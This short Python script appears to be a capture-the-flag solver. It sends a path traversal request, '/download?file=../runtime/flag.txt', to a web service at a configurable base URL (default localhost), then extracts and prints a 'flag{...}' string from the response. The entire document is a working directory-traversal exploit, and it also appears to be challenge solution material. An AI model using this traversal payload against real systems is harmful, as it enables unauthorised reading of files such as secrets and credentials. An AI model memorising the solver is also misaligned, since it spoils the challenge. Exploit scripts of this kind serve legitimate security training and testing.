#!/usr/bin/env python3
from __future__ import annotations

import os
import re
import urllib.request


def main() -> None:
    base_url = os.getenv('BASE_URL', 'http://127.0.0.1:8080').rstrip('/')
    body = urllib.request.urlopen(
        f'{base_url}/download?file=../runtime/flag.txt'
    ).read().decode()
    match = re.search(r'flag\{[a-zA-Z0-9_\-]+\}', body)
    if not match:
        raise SystemExit('flag not found')
    print(match.group(0))


if __name__ == '__main__':
    main()
